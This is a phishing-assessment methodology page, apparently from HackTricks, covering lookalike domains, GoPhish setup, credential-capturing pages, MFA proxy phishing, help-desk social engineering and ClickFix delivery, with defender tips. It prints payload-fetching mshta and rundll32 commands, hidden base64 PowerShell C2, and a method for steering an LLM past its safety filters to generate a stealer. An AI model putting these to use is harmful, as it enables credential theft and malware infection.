# Methodology ya Phishing

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Fanya Recon ya victim
1. Chagua **victim domain**.
2. Fanya web enumeration ya msingi **ukitafuta login portals** zinazotumiwa na victim na **amua** ni ipi utakayo **impersonate**.
3. Tumia **OSINT** fulani ili **kupata emails**.
2. Andaa mazingira
1. **Nunua domain** utakayotumia kwa tathmini ya phishing
2. **Configure records** zinazohusiana na email service (SPF, DMARC, DKIM, rDNS)
3. Configure VPS yenye **gophish**
3. Andaa campaign
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Zindua campaign!

## Generate domain names zinazofanana au nunua domain inayoaminika

### Mbinu za Variation ya Domain Name

- **Keyword**: Domain name **ina** **keyword** muhimu ya original domain (mfano, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Badilisha **dot kuwa hyphen** ya subdomain (mfano, www-zelster.com).
- **New TLD**: Domain ileile ikitumia **TLD mpya** (mfano, zelster.org)
- **Homoglyph**: **Inabadilisha** herufi katika domain name kwa **herufi zinazofanana kwa mwonekano** (mfano, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Inabadilisha nafasi za herufi mbili** ndani ya domain name (mfano, zelsetr.com).
- **Singularization/Pluralization**: Inaongeza au kuondoa “s” mwishoni mwa domain name (mfano, zeltsers.com).
- **Omission**: **Inaondoa moja** ya herufi kutoka kwenye domain name (mfano, zelser.com).
- **Repetition:** **Inarudia moja** ya herufi katika domain name (mfano, zeltsser.com).
- **Replacement**: Kama homoglyph lakini si stealthy sana. Inabadilisha moja ya herufi katika domain name, labda kwa herufi iliyo karibu na herufi ya awali kwenye keyboard (mfano, zektser.com).
- **Subdomained**: Inaweka **dot** ndani ya domain name (mfano, ze.lster.com).
- **Insertion**: **Inaingiza herufi** kwenye domain name (mfano, zerltser.com).
- **Missing dot**: Ambatisha TLD kwenye domain name. (mfano, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zilizo kwenye mawasiliano zinaweza kubadilishwa automatically** kutokana na sababu mbalimbali kama solar flares, cosmic rays, au hardware errors.

Dhana hii **inapotumika kwa DNS requests**, inawezekana kwamba **domain iliyopokelewa na DNS server** si sawa na domain iliyoombwa mwanzoni.

Kwa mfano, mabadiliko ya bit moja katika domain "windows.com" yanaweza kuibadilisha kuwa "windnws.com."

Attackers wanaweza **kuchukua fursa ya hili kwa kusajili domains nyingi za bit-flipping** zinazofanana na domain ya victim. Lengo lao ni kuwaelekeza watumiaji halali kwenye infrastructure yao wenyewe.

Kwa maelezo zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Nunua domain inayoaminika

Unaweza kutafuta katika [https://www.expireddomains.net/](https://www.expireddomains.net) domain iliyo-expire ambayo unaweza kutumia.\
Ili kuhakikisha kwamba domain iliyo-expire unayokusudia kununua **tayari ina SEO nzuri**, unaweza kutafuta jinsi ilivyoainishwa katika:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Kugundua Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua** valid email addresses **zaidi** au **kuverify zile** ambazo tayari umeziona, unaweza kuangalia kama unaweza kuzifanyia brute-force kwenye smtp servers za victim. [Jifunze jinsi ya kuverify/kugundua email address hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pia, usisahau kwamba ikiwa users wanatumia **web portal yoyote kufikia mails zao**, unaweza kuangalia kama ina vulnerability ya **username brute force**, na ku-exploit vulnerability hiyo ikiwezekana.

## Ku-Configure GoPhish

### Installation

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na decompress ndani ya `/opt/gophish` na execute `/opt/gophish/gophish`\
Utapewa password ya admin user kwenye port 3333 katika output. Kwa hiyo, access port hiyo na utumie credentials hizo kubadilisha admin password. Huenda ukahitaji kutunnel port hiyo kwenda local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Usanidi

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii, unapaswa kuwa **umeshanunua domain** utakayotumia, na lazima iwe **inaelekeza** kwenye **IP ya VPS** ambapo unaset up **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua pepe**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Pia badilisha thamani za variables zifuatazo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye, badilisha faili **`/etc/hostname`** na **`/etc/mailname`** ziwe na jina la domain yako na **uwashe upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **ip address** ya VPS na **DNS MX** record inayoelekeza kwenye `mail.<domain>`

Sasa hebu tujaribu kutuma email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa gophish na tuisanidi.\
Badilisha `/opt/gophish/config.json` iwe ifuatayo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi service ya gophish**

Ili kuunda service ya gophish ambayo inaweza kuwashwa kiotomatiki na kusimamiwa kama service, unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi huduma na kuikagua kwa kufanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri na uwe halali

Kadiri domain ilivyo ya zamani, ndivyo uwezekano wa kutambuliwa kama spam unavyopungua. Kwa hiyo, unapaswa kusubiri muda mrefu iwezekanavyo (angalau wiki 1) kabla ya kufanya phishing assessment. Zaidi ya hayo, ukiweka ukurasa kuhusu sekta yenye sifa nzuri, reputation itakayopatikana itakuwa bora zaidi.

Kumbuka kwamba hata kama ni lazima usubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Kusanidi rekodi ya Reverse DNS (rDNS)

Weka rekodi ya rDNS (PTR) inayotatua anwani ya IP ya VPS kuwa domain name.

### Rekodi ya Sender Policy Framework (SPF)

Lazima **usanidi rekodi ya SPF kwa domain mpya**. Ikiwa hujui rekodi ya SPF ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kuzalisha SPF policy yako (tumia IP ya mashine ya VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Hii ndiyo content inayopaswa kuwekwa ndani ya rekodi ya TXT ndani ya domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Lazima uunde rekodi mpya ya DNS TXT inayoelekeza hostname `_dmarc.<domain>` yenye maudhui yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui DMARC record ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Tutorial hii inategemea: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 zinazozalishwa na DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testi alama ya usanidi wa barua pepe

Unaweza kufanya hivyo ukitumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Fungua tu ukurasa huo na utume barua pepe kwenye anwani watakayokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kuangalia usanidi wa barua pepe** kwa kutuma barua pepe kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu katika faili _/var/mail/root_ ikiwa utatuma barua pepe ukiwa root).\
Hakikisha kwamba umepita majaribio yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa Gmail iliyo chini ya udhibiti wako**, na kuangalia **vichwa vya barua pepe** katika kikasha chako cha Gmail; `dkim=pass` inapaswa kuwepo katika sehemu ya kichwa ya `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Kuondoa kwenye Spamhaus Blacklist

Ukurasa wa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa domain yako imezuiwa na Spamhaus. Unaweza kuomba domain/IP yako iondolewe kupitia: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondoa kwenye Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kupitia [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Weka **jina la kutambua** sender profile
- Amua utatuma phishing emails kutoka kwenye account ipi. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: Unaweza kuacha username na password wazi, lakini hakikisha umechagua Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa utumie utendaji wa "**Send Test Email**" ili kujaribu kama kila kitu kinafanya kazi.\
> Ningependekeza **utume test emails kwenye 10min mail addresses** ili kuepuka kuwekwa kwenye blacklist wakati wa kufanya majaribio.

### Email Template

- Weka **jina la kutambua** template
- Kisha andika **subject** (usiandike kitu cha ajabu, andika tu kitu ambacho ungetarajia kusoma kwenye email ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **email template** (unaweza kutumia variables kama ilivyo kwenye mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uaminifu wa email**, inashauriwa kutumia signature kutoka kwenye email ya client. Mapendekezo:

- Tuma email kwa **anwani ambayo haipo** na uangalie kama jibu lina signature yoyote.
- Tafuta **public emails** kama info@ex.com au press@ex.com au public@ex.com, zitumie email na usubiri jibu.
- Jaribu kuwasiliana na **email halali iliyogunduliwa** na usubiri jibu

![Sending Profile - Email Template: Jaribu kuwasiliana na email halali iliyogunduliwa na usubiri jibu](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha files za kutuma**. Ikiwa ungependa pia kuiba NTLM challenges kwa kutumia files/documents zilizotengenezwa maalum [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Weka **name**
- **Andika HTML code** ya web page. Kumbuka kwamba unaweza **ku-import** web pages.
- Weka alama kwenye **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Weka alama kwenye Capture Submitted Data na Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya page na kufanya tests za local (labda ukitumia Apache server) **hadi uridhike na matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia static resources** za HTML (labda baadhi ya CSS na JS pages) unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha uzifikie kutoka _**/static/\<filename>**_

> [!TIP]
> Kwa redirection unaweza **kuwa-redirect users kwenye legit main web page** ya victim, au kuwa-redirect kwenye _/static/migration.html_ kwa mfano, uweke **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha uonyeshe kwamba mchakato umefanikiwa**.

### Users & Groups

- Weka name
- **Import data** (kumbuka kwamba ili kutumia template ya mfano unahitaji firstname, last name na email address ya kila user)

![Landing Page - Users & Groups: Import data (kumbuka kwamba ili kutumia template ya mfano unahitaji firstname, last name na email address ya kila user)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign kwa kuchagua name, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa link itakayotumwa kwa victims.

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email ili kuona jinsi final phishing email itakavyoonekana**:

![Users & Groups - Campaign: Kumbuka kwamba Sending Profile inaruhusu kutuma test email ili kuona jinsi final phishing email itakavyoonekana](<../../images/image (192).png>)

Kila kitu kikiwa tayari, launch campaign tu!

## Website Cloning

Ikiwa kwa sababu yoyote unataka ku-clone website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya phishing assessments (hasa kwa Red Teams) utataka pia **kutuma files zenye aina fulani ya backdoor** (labda C2 au kitu kitakachotrigger authentication).\
Angalia ukurasa ufuatao kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Attack iliyotangulia ni ya ujanja kwa sababu unafake website halisi na kukusanya taarifa iliyowekwa na user. Kwa bahati mbaya, ikiwa user hakuweka password sahihi au ikiwa application uliyofake imewekwa 2FA, **taarifa hii haitakuruhusu ku-impersonate user aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapokuwa muhimu. Tool hii itakuruhusu kutengeneza attack inayofanana na MitM. Kimsingi, attack hufanya kazi kwa njia ifuatayo:

1. Una **impersonate login** form ya webpage halisi.
2. User **anatuma** **credentials** zake kwenye fake page yako, na tool inazituma kwenye webpage halisi, **ikiangalia kama credentials zinafanya kazi**.
3. Account ikiwa imewekwa **2FA**, MitM page itaomba 2FA na mara **user anapoiingiza**, tool itaituma kwenye real web page.
4. Mara user anapokuwa authenticated, wewe (kama attacker) utakuwa **umecapture credentials, 2FA, cookie na taarifa yoyote** kutoka kwenye kila interaction yako wakati tool inafanya MitM.

### Via VNC

Je, ikiwa badala ya **kumtuma victim kwenye malicious page** yenye mwonekano sawa na ya awali, utamtuma kwenye **VNC session yenye browser iliyounganishwa kwenye real web page**? Utaweza kuona anachofanya, kuiba password, MFA iliyotumika, cookies...\
Unaweza kufanya hivi kwa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ni wazi kwamba mojawapo ya njia bora za kujua kama umebusted ni **kutafuta domain yako ndani ya blacklists**. Ikiwa itaonekana ikiwa listed, kwa namna fulani domain yako imegunduliwa kuwa suspicious.\
Njia moja rahisi ya kuangalia kama domain yako inaonekana kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama victim **anatafuta kwa bidii shughuli za suspicious phishing kwenye internet** kama ilivyoelezwa kwenye:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya victims **na/au kutengeneza certificate** kwa **subdomain** ya domain unayo-control **iliyo na** **keyword** ya domain ya victim. Ikiwa **victim** atafanya aina yoyote ya **DNS au HTTP interaction** nazo, utajua kwamba **anatafuta kwa bidii** suspicious domains na utahitaji kuwa stealth sana.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama email yako itaishia kwenye spam folder au itablockiwa au kufanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets zinazidi kuacha email lures kabisa na **kulenga moja kwa moja service-desk / identity-recovery workflow** ili kushinda MFA. Attack hii ni "living-off-the-land" kikamilifu: operator akishamiliki credentials halali, anapivot kwa kutumia admin tooling iliyojengwa ndani – malware haihitajiki.<sup>[[6]](#references)</sup>

### Attack flow
1. Fanya recon ya victim
* Kusanya personal & corporate details kutoka LinkedIn, data breaches, public GitHub, n.k.
* Tambua identities zenye thamani kubwa (executives, IT, finance) na orodhesha **help-desk process kamili** ya password / MFA reset.
2. Real-time social engineering
* Piga simu, tumia Teams au chat kuwasiliana na help-desk huku ukijifanya kuwa target (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII iliyokusanywa awali ili kupita knowledge-based verification.
* Mshawishi agent **areset MFA secret** au afanye **SIM-swap** kwenye mobile number iliyosajiliwa.
3. Immediate post-access actions (≤60 min in real cases)
* Establish foothold kupitia web SSO portal yoyote.
* Enumerate AD / AzureAD kwa built-ins (hakuna binaries zinazoachwa):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Fanya lateral movement kwa **WMI**, **PsExec**, au legitimate **RMM** agents ambazo tayari zimewhitelistiwa kwenye environment.

### Detection & Mitigation
* Chukulia identity recovery ya help-desk kama **privileged operation** – hitaji step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules zinazotoa alert kuhusu:
* MFA method imebadilishwa + authentication kutoka device / geo mpya.
* Immediate elevation ya principal huyo huyo (user-→-admin).
* Record help-desk calls na enforce **call-back kwa number iliyosajiliwa tayari** kabla ya reset yoyote.
* Implement **Just-In-Time (JIT) / Privileged Access** ili accounts zilizoresetiwa hivi karibuni **zisirithi high-privilege tokens** moja kwa moja.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews hupunguza gharama ya high-touch ops kwa mass attacks zinazogeuza **search engines & ad networks kuwa delivery channel**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** husukuma fake result kama `chromium-update[.]site` hadi juu ya search ads.
2. Victim anapakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoonekana na Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader hu-exfiltrate browser cookies + credential DBs, kisha hupakua **silent loader** ambayo huamua – *in realtime* – kama itadeploy:
* RAT (k.m. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** kwenye *search-ads* pamoja na e-mail.
* Restrict software installation kwa signed MSI / Store packages, kata execution ya `HTA`, `ISO`, `VBS` kwa policy.
* Monitor child processes za browsers zinazofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt kwa LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (k.m. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Baadhi ya fake software portals huacha download `href` inayoonekana ikielekeza kwenye **real** GitHub/release URL, lakini huzima **first** user interaction kwa JavaScript na badala yake humpeleka victim kwenye chain ya **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sifa kuu:
- Hook kwa kawaida huendeshwa katika **capture phase** (`true`) kwenye `document`, hivyo hutokea kabla ya site handlers.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuweka redirect ikiwa imefungwa kwenye **user gesture** halali na kuboresha bypass ya popup-blocker.
- Baadhi ya variants hufungua mapema `about:blank` au huunda clicks za `<a target="_blank">`, kisha huweka TDS URL baadaye.
- Browser-side caps mara nyingi huhifadhiwa kwenye `localStorage`, hivyo **first click** inaweza kumfikisha mwathiriwa kwenye malware, huku refresh/retry zikirejea kwenye visible link inayoonekana kuwa salama.
- TDS inaweza kuchuja kwa referrer, entry domain, GEO, browser/device fingerprint, ukaguzi wa VPN/datacenter, click context, na per-session counters, hivyo replays za analyst zinaweza kutoa matokeo yasiyotabirika.

Mawazo ya Defender:
- Linganisha `href` **inayoonyeshwa** na navigation target **halisi** inayoundwa wakati wa click.
- Tafuta handlers za `document.addEventListener(..., true)` zinazotumia pamoja `preventDefault()` na `stopImmediatePropagation()` karibu na `window.open`, `about:blank`, au synthetic anchor clicks.
- Chukulia makundi ya software-download domains zilizosajiliwa hivi karibuni ambazo zote hupakia stage ileile ya CloudFront/JS kama pattern yenye signal kubwa ya SEO-poisoning/TDS.

### ClickFix kutoka kwenye fake verification pages + archive-looking LOLBAS fetches
Baadhi ya TDS branches huishia kwenye fake verification page (mtindo wa Cloudflare/IUAM) inayomwambia mwathiriwa aendeshe Windows binary inayoaminika kama:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Maelezo:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa response**, hata kama URL inajifanya kuwa archive ya `.7z`; data ya archive iliyoongezwa inaweza kuwa decoy tupu.
- Hatua zinazofuata mara nyingi huendelea kupotosha kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zenye binaries zilizoongezwa padding), kisha hubadilisha hadi **manual PE mapping / in-memory execution**.
- Ikiwa unajibu mojawapo ya chains hizi, hifadhi **network + memory kuanzia run ya kwanza iliyofanikiwa**: replays za baadaye zinaweza kuonyesha tu njia salama ya installer/SFX au kushindwa kwa sababu payload/key release ilifungwa kwenye TDS session ya awali.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: advisory ya kitaifa ya CERT iliyokopiwa, yenye kitufe cha **Update** kinachoonyesha maelekezo ya “fix” hatua kwa hatua. Victims huambiwa waendeshe batch inayopakua DLL na kuitekeleza kupitia `rundll32`.<sup>[[12]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` huweka payload kwenye `%TEMP%`, sleep fupi huficha network jitter, kisha `rundll32` huita exported entrypoint (`notepad`).
* DLL hutuma host identity kwa beacon na ku-poll C2 kila baada ya dakika chache. Remote tasking hufika kama **base64-encoded PowerShell** inayotekelezwa ikiwa imefichwa na ikiwa na policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii hudumisha C2 flexibility (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha console windows. Tafuta children wa `rundll32.exe` ambao ni PowerShell na wanaotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Defenders wanaweza kutafuta HTTP(S) callbacks za mfumo `...page.php?tynor=<COMPUTER>sss<USER>` na polling intervals za dakika 5 baada ya DLL load.

---

## AI-Enhanced Phishing Operations
Attackers sasa wanaunganisha **LLM & voice-clone APIs** kwa lures zilizobinafsishwa kikamilifu na interaction ya real-time.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Ongeza **dynamic banners** zinazoangazia messages zilizotumwa kutoka kwenye automation isiyoaminika (kupitia ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** kwa phone requests zenye risk kubwa.
• Endelea ku-simulate lures zinazozalishwa na AI kwenye awareness programmes – static templates zimepitwa na wakati.

Tazama pia – agentic browsing abuse kwa credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Tazama pia – AI agent abuse ya local CLI tools na MCP (kwa secrets inventory na detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers wanaweza kutuma HTML inayoonekana benign na **kuzalisha stealer wakati wa runtime** kwa kuiomba **trusted LLM API** JavaScript, kisha kuitekeleza ndani ya browser (kwa mfano, `eval` au dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings kwenye prompt; itererate wording ili kupita safety filters na kupunguza hallucinations.
2. **Client-side API call:** wakati wa load, JS huita public LLM (Gemini/DeepSeek/etc.) au CDN proxy; prompt/API call pekee ndiyo ipo kwenye static HTML.
3. **Assemble & exec:** unganisha response na kuitekeleza (polymorphic kwa kila visit):
```javascript
